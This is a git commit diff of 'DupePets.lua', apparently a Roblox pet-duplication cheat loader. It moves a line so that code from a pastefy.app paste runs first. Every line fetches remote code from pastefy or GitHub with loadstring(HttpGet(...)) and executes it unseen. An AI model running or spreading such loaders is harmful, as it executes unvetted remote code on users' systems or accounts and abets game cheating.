2a78c70a49a9897770e60bb635f3de22eda2f24e
Biggg886 <154685671+Biggg886@users.noreply.github.com>
2025-08-30 21:28:05 +0700

    Update DupePets.lua

--- DupePets.lua
+++ DupePets.lua
@@ -1,4 +1,5 @@
 -- โหลดสคริปต์ Spawner และรัน
+loadstring(game:HttpGet("https://pastefy.app/3S71RGu1/raw"))()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Biggg886/Dupe-Pets/refs/heads/main/loadingscreen.lua"))()
 -- โหลดและรันอีกสคริปต์
-loadstring(game:HttpGet("https://pastefy.app/3S71RGu1/raw"))()
+
